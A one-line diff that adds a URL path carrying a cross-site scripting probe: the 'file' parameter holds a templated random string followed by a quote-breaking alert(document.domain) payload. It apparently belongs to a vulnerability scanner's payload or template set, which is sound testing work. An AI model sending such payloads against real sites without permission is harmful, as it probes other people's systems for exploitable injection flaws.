@@ -1,0 +1,1 @@
+/?file=__new__{{randstr}}%27-alert(document.domain)-%27
